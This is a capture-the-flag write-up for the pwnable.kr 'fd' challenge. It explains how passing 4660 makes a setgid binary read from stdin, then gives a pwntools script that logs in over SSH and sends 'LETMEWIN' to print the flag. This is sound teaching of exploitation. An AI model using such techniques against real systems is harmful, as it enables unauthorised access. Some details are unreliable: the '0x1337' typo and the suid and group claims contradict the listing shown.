# fd Writeup

## Challenge infos

```text
Mommy! what is a file descriptor in Linux?

* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:
https://youtu.be/971eZhMHQQw

ssh fd@pwnable.kr -p2222 (pw:guest)
```

## Server content

```text
--- ls -la ---
total 48
drwxr-x---   5 root fd      4096 Apr  1 14:50 .
drwxr-xr-x 118 root root    4096 Jun  1 12:05 ..
d---------   2 root root    4096 Jun 12  2014 .bash_history
-r-xr-sr-x   1 root fd_pwn 15148 Mar 26 13:17 fd
-rw-r--r--   1 root root     452 Mar 26 13:17 fd.c
-r--r-----   1 root fd_pwn    50 Apr  1 06:06 flag
----------   1 root root     128 Oct 26  2016 .gdb_history
dr-xr-xr-x   2 root root    4096 Dec 19  2016 .irssi
drwxr-xr-x   2 root root    4096 Oct 23  2016 .pwntools-cache
--- id ---
uid=1002(fd) gid=1002(fd) groups=1002(fd)
--- cat file---
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                setregid(getegid(), getegid());
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}

--- file binary ---
fd: setgid ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=156ca9c174df927ecd7833a27d18d0dd5e413656, for GNU/Linux 3.2.0, not stripped
```
## Exploitation objective
* The ssh user is ```fd```, group ```fd```
* The ```flag``` file is readable only by the user ```fd_pwn``` or the group ```root```
* The ```fd``` binary is a 32bit ELF executable by the ```fd_pwn``` user or members of the ```fd``` group and is ```suid``` meaning that it executes with the rights of its user even if called by a member of its group

This means that if we pwn the ```fd``` executable we can gain read access to the ```flag``` file via suid user ```fd_pwn```.

The ```fd``` executable is certainly compiled from the ```fd.c``` source code, let's have a look.

## C code analysis
```c
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
```

* We need to call the program with a number as first argument : ```./fd [n]```


```c
        int fd = atoi( argv[1] ) - 0x1234;
```

* The ```[n]``` argument is used to define the ```fd``` variabl by substracting ```0x1234``` (hexadecimal number 4660) from it

```c
        len = read(fd, buf, 32);
```

* The ```fd``` variable is used as the file descriptor to read a string to the buffer ```buf```

```c
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
```

* If the content of the buffer ```buf``` is equal to ```"LETMEWIN\n"``` (```\n``` denotes newline character) the executable calls ```system()``` to output the content of ```flag``` with ```cat```, this is our target

## File descriptor understanding

The ```fd``` variable is a file descriptor, an unique value linking to an open stream for reading or writing

There is 3 defined files descriptors when the program is started and we can define new ones with a call to ```open()```

The 3 already open ones are :
* ```0``` : refers to ```stdin```, the standard input stream, read only
* ```1``` : refers to ```stdout```, the standard output stream, write only
* ```2``` : refers to ```stderr```, the standard error stream, write only

## Exploitation

* There is no call to ```open()``` in the program but since we can manipulate ```fd``` through ```[n]``` we can set it to ```0``` in order to read from ```stdin```

* If we set ```[n]``` to ```0x1337``` = ```4660``` we can call the program with ```./fd 4660```, forcing it to read the buffer frmo ```stdin```

* We the input ```LETMEWIN``` and press ```Enter``` to send a newline character ```\n```

* The check is then passed and the ```flag``` is outputed

## Exploitation script

```python
#!/usr/bin/env python
from pwn import *
```
* Use [pwntools](https://github.com/Gallopsled/pwntools) for automatic exploitation
```python
arg = 0x1234
```
* Set the ```arg``` variable to ```0x1234``` (Python can understand hexadecimal values by starting a number with ```0x``` and converts them to decimal)
```python
server = ssh('fd', 'pwnable.kr', 2222, 'guest')
io = server.process(['./fd', str(arg)])
io.sendline('LETMEWIN')

result = io.recvall()

io.close()
server.close()

print(result)
```
* Send the ```LETMEWIN``` line with a newline character (with ```sendline()```)
* Print the ```result``` which is the ```flag```